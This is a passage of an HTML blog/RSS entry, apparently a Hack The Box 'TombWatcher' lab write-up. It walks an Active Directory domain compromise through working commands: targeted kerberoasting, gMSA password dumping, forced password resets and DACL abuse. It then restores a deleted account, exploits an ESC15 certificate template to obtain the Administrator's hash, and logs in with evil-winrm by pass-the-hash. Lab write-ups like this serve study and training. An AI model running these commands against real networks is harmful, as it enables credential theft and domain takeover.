+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628005807.webp">&lt;/figure>
+&lt;p>&lt;code>sam&lt;/code> have &lt;code>WriteOwner&lt;/code> over user &lt;code>john&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628010434.webp">&lt;/figure>
+&lt;p>We can abuse this by granting ourself &lt;code>genericAll&lt;/code>. From there we can perform three attacks to get access to &lt;code>john&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>Targeted kerberoasting&lt;/li>
+&lt;li>Shadow credentials&lt;/li>
+&lt;li>Force change password&lt;/li>
+&lt;/ol>
+&lt;p>John is a member of &lt;code>Remote Management Users&lt;/code> group so we can use winrm to login.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628121356.webp">&lt;/figure>
+&lt;p>&lt;code>john&lt;/code> also have &lt;code>genericAll&lt;/code> over the OU &lt;code>ADCS&lt;/code>.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628164423.webp">&lt;/figure>
+&lt;p>I&amp;rsquo;m not sure how to exploit this further. So far this is the whole attack path we have figured out from bloodhound:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628164823.webp">&lt;/figure>
+&lt;p>So let&amp;rsquo;s get started.&lt;/p>
+&lt;h2 id="attacking-alfred">Attacking &lt;code>alfred&lt;/code>&lt;/h2>
+&lt;h3 id="targeted-kerberoasting">Targeted kerberoasting&lt;/h3>
+&lt;p>We have &lt;code>WriteSPN&lt;/code> permission so we can set spn and get a TGS and try to crack it. I&amp;rsquo;m setting the spn to &lt;code>tombwatcher/fakesvc&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u henry -p &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> object &lt;span style="color:#b8bb26">&amp;#39;Alfred&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;servicePrincipalName&amp;#39;&lt;/span> -v &lt;span style="color:#b8bb26">&amp;#39;tombwatcher/fakesvc&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628002715.webp">&lt;/figure>
+&lt;p>Getting service ticket hash:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>GetUserSPNs.py -dc-ip DC01.tombwatcher.htb tombwatcher.htb/henry:&lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> -outputfile kerberoastables.txt -request
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628002745.webp">&lt;/figure>
+&lt;p>Crack the password:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -a &lt;span style="color:#d3869b">0&lt;/span> kerberoastables.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628002945.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s test the new credentials with &lt;code>nxc&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nxc smb tombwatcher.htb -u Alfred -p &lt;span style="color:#b8bb26">&amp;#39;basketball&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628003058.webp">&lt;/figure>
+&lt;p>Success!&lt;/p>
+&lt;h3 id="add-alfred-to-the-infrastructure-group">Add &lt;code>alfred&lt;/code> to the &lt;code>Infrastructure&lt;/code> group&lt;/h3>
+&lt;p>We can add new member to a group using &lt;code>bloodyad&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u alfred -p &lt;span style="color:#b8bb26">&amp;#39;basketball&amp;#39;&lt;/span> add groupMember Infrastructure alfred
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628004042.webp">&lt;/figure>
+&lt;p>Then verify this by running this command:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u alfred -p &lt;span style="color:#b8bb26">&amp;#39;basketball&amp;#39;&lt;/span> get membership alfred
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628004109.webp">&lt;/figure>
+&lt;h2 id="read-gmsa-password-for-ansible_dev">Read GMSA password for &lt;code>ansible_dev$&lt;/code>&lt;/h2>
+&lt;p>I&amp;rsquo;m using &lt;a href="https://github.com/micahvandeusen/gMSADumper">&lt;code>gMSADumper.py&lt;/code>&lt;/a> to read the GMSA Password:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>gmsadumper -u alfred -p basketball -d tombwatcher.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628004320.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s quickly check if the NTLM can be cracked:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628004400.webp">&lt;/figure>
+&lt;p>Turns out it&amp;rsquo;s not, but still we can use the hash:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> nxc smb tombwatcher.htb -u &lt;span style="color:#b8bb26">&amp;#39;ansible_dev$&amp;#39;&lt;/span> --aesKey &lt;span style="color:#b8bb26">&amp;#39;3eafb50e4a2d0982e7f8ac906387f812703bab1a23d300d5cb450639bb359f7b&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628004607.webp">&lt;/figure>
+&lt;p>And it&amp;rsquo;s working&lt;/p>
+&lt;h2 id="attacking-sam">Attacking &lt;code>sam&lt;/code>&lt;/h2>
+&lt;h3 id="abusing-forcechangepassword">Abusing &lt;code>ForceChangePassword&lt;/code>&lt;/h3>
+&lt;p>Let&amp;rsquo;s request a TGT for &lt;code>ansible_dev$&lt;/code> first:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> getTGT.py -dc-ip DC01.tombwatcher.htb &lt;span style="color:#b8bb26">&amp;#39;tombwatcher/ansible_dev$&amp;#39;&lt;/span> -aesKey &lt;span style="color:#b8bb26">&amp;#39;3eafb50e4a2d0982e7f8ac906387f812703bab1a23d300d5cb450639bb359f7b&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628010153.webp">&lt;/figure>
+&lt;p>Now we can use this with &lt;code>bloodyad&lt;/code> to reset the password of &lt;code>sam&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>KRB5CCNAME&lt;span style="color:#fe8019">=&lt;/span>./ansible_dev&lt;span style="color:#b8bb26">\$&lt;/span>.ccache faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> bloodyad -d tombwatcher.htb -i $IP -k -H DC01.tombwatcher.htb -u &lt;span style="color:#b8bb26">&amp;#39;ansible_dev$&amp;#39;&lt;/span> msldap changeuserpw &lt;span style="color:#b8bb26">&amp;#39;CN=SAM,CN=USERS,DC=TOMBWATCHER,DC=HTB&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628005933.webp">&lt;/figure>
+&lt;p>Verify the new password:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nxc smb tombwatcher.htb -u &lt;span style="color:#b8bb26">&amp;#39;sam&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628010307.webp">&lt;/figure>
+&lt;h2 id="attacking-john">Attacking &lt;code>john&lt;/code>&lt;/h2>
+&lt;h3 id="add-ownership-for-john">Add ownership for &lt;code>john&lt;/code>&lt;/h3>
+&lt;p>&lt;code>sam&lt;/code> have write owner permission over user &lt;code>john&lt;/code>. We can set &lt;code>sam&lt;/code> as the owner using &lt;code>bloodyad&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;sam&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> owner john sam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628105509.webp">&lt;/figure>
+&lt;p>We now have &lt;code>writeDacl&lt;/code> over &lt;code>john&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;sam&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> get writable
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628105810.webp">&lt;/figure>
+&lt;h3 id="granting-genericall">Granting &lt;code>genericAll&lt;/code>&lt;/h3>
+&lt;p>With this we can grant user &lt;code>sam&lt;/code> the &lt;code>genericAll&lt;/code> permission over user &lt;code>john&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;sam&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> add genericAll john sam
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628120902.webp">&lt;/figure>
+&lt;h3 id="resetting-password-of-john">Resetting password of &lt;code>john&lt;/code>&lt;/h3>
+&lt;p>And as I mentioned before we can abuse this in three different ways, this time I&amp;rsquo;ll change the password (not very opsec friendly):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;sam&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> password john &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628121108.webp">&lt;/figure>
+&lt;p>Again verify the new credentials&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nxc smb tombwatcher.htb -u &lt;span style="color:#b8bb26">&amp;#39;john&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628121138.webp">&lt;/figure>
+&lt;h3 id="shell-as-john">Shell as &lt;code>john&lt;/code>&lt;/h3>
+&lt;p>Since &lt;code>john&lt;/code> is a member of the &lt;code>Remote Management Users&lt;/code> we can use winrm to login and get shell access:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>evil-winrm -i DC01.tombwatcher.htb -u john -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628121441.webp">&lt;/figure>
+&lt;h2 id="auth-as-domain-admin">Auth as Domain Admin&lt;/h2>
+&lt;h3 id="restoring-cert_admin">Restoring &lt;code>cert_admin&lt;/code>&lt;/h3>
+&lt;p>User john have write permission on OU &lt;code>ADCS&lt;/code> and a deleted user &lt;code>cert_admin&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;john&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> get writable
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628150724.webp">&lt;/figure>
+&lt;p>After enumerating the available certificate templates, one of the template shows an SID that&amp;rsquo;s not resolving to any user or machine account:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>certipy find -u john@tombwatcher.htb -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> -stdout
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628150443.webp">&lt;/figure>
+&lt;p>An object with SID &lt;code>S-1-5-21-1392491010-1358638721-2126982587-1111&lt;/code> have enrollment rights for the &lt;code>WebServer&lt;/code> rights. I would like to corelate this with the deleted user we saw earlier. Let&amp;rsquo;s verify it using &lt;code>bloodyad&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;john&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --attr sAMAccountName,objectCategory,objectSid --base &lt;span style="color:#b8bb26">&amp;#39;CN=Deleted Objects,DC=tombwatcher,DC=htb&amp;#39;&lt;/span> --filter &lt;span style="color:#b8bb26">&amp;#39;(isDeleted=TRUE)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In one of the object we can see the above SID:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628200553.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s restore the deleted object:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;john&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> restore &lt;span style="color:#b8bb26">&amp;#39;CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628155036.webp">&lt;/figure>
+&lt;h3 id="changing-cert_admin-password">Changing &lt;code>cert_admin&lt;/code> password&lt;/h3>
+&lt;p>Since we have write access on &lt;code>cert_admin&lt;/code>, we can change the password:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>bloodyad -d tombwatcher.htb -i $IP -u &lt;span style="color:#b8bb26">&amp;#39;john&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">set&lt;/span> password &lt;span style="color:#b8bb26">&amp;#39;cert_admin&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628200929.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s run certipy again:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>certipy find -u cert_admin@tombwatcher.htb -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> -vulnerable -stdout
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628201057.webp">&lt;/figure>
+&lt;p>We see that this template is vulnerable to ESC15&lt;/p>
+&lt;h3 id="exploiting-esc15-aka-ekuwu">Exploiting ESC15 aka &amp;ldquo;EKUwu&amp;rdquo;&lt;/h3>
+&lt;div class="alert alert-note ">
+&lt;div class="alert-heading-box" >
+&lt;i class="bx bx-info-circle">&lt;/i>
+&lt;p class="alert-heading">
+About ESC15
+&lt;/p>
+&lt;/div>
+&lt;div class="alert-content" >
+&lt;p>Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the &lt;strong>&lt;em>WebServer&lt;/em>&lt;/strong> template. &lt;a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">&lt;/a>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>An EKU or Extended Key Usage attribute in a template specifies what the certificate can be used for. For example, there are Server Authentication, Client Authentication, Code Signing, Email Protection, etc. Each of these is represented by its OID. OID for Client Authentication is 1.3.6.1.5.5.7.3.2. A template can be restricted to specific enrollment rights. A template used for codesigning cannot be used for client authentication. This is the assumption that&amp;rsquo;s broken in ESC15.&lt;/p>
+&lt;p>This attack only works if these three things are met:&lt;/p>
+&lt;ol>
+&lt;li>Template must be using Schema Version 1&lt;/li>
+&lt;li>It must have EnrolleeSuppliesSubject (&lt;code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/code>) enabled&lt;/li>
+&lt;li>The server must be vulnerable to &lt;code>CVE-2024-49019&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;p>If these requirements are met, we can create a malicious CSR request and inject any application policy OID like &amp;ldquo;Client Authentication&amp;rdquo; and send it to the server. Even if the target template is not allowed to issue certificate for the extension we provide, the CA will not override, strip, or validate it.&lt;/p>
+&lt;p>There are 2 methods for exploiting this which explained well in the certipy wiki. For some reasons the first method was not working. So we&amp;rsquo;ll exploit this using the second method.&lt;/p>
+&lt;p>First send a request a certificate with &amp;ldquo;Certificate Request Agent&amp;rdquo;, which injects the OID &lt;code>1.3.6.1.4.1.311.20.2.1&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> certipy req -u &lt;span style="color:#b8bb26">&amp;#39;cert_admin@tombwatcher.htb&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> -dc-ip $IP -template WebServer -application-policies &lt;span style="color:#b8bb26">&amp;#34;Certificate Request Agent&amp;#34;&lt;/span> -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -debug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628205631.webp">&lt;/figure>
+&lt;p>We can use the agent certificate to request a certifcate on behalf of another user, in our case the &lt;code>Administrator&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> certipy req -u &lt;span style="color:#b8bb26">&amp;#39;cert_admin@tombwatcher.htb&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;Password@123&amp;#39;&lt;/span> -dc-ip $IP -template User -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -pfx cert_admin.pfx -on-behalf-of &lt;span style="color:#b8bb26">&amp;#39;TOMBWATCHER\Administrator&amp;#39;&lt;/span> -debug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628205229.webp">&lt;/figure>
+&lt;p>Now we can use the certificate to get the hash of the &lt;code>Administrator&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> certipy auth -pfx administrator.pfx -dc-ip $IP -debug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628210910.webp">&lt;/figure>
+&lt;p>We can use the hash to login via winrm and read the flag:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>evil-winrm -i DC01.tombwatcher.htb -u Administrator -H f61db423bebe3328d33af26741afe5fc
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628211108.webp">&lt;/figure>
+&lt;hr>
+&lt;h3 id="references">References&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc&lt;/a>&lt;/li>
+&lt;/ul></content></item></channel></rss>
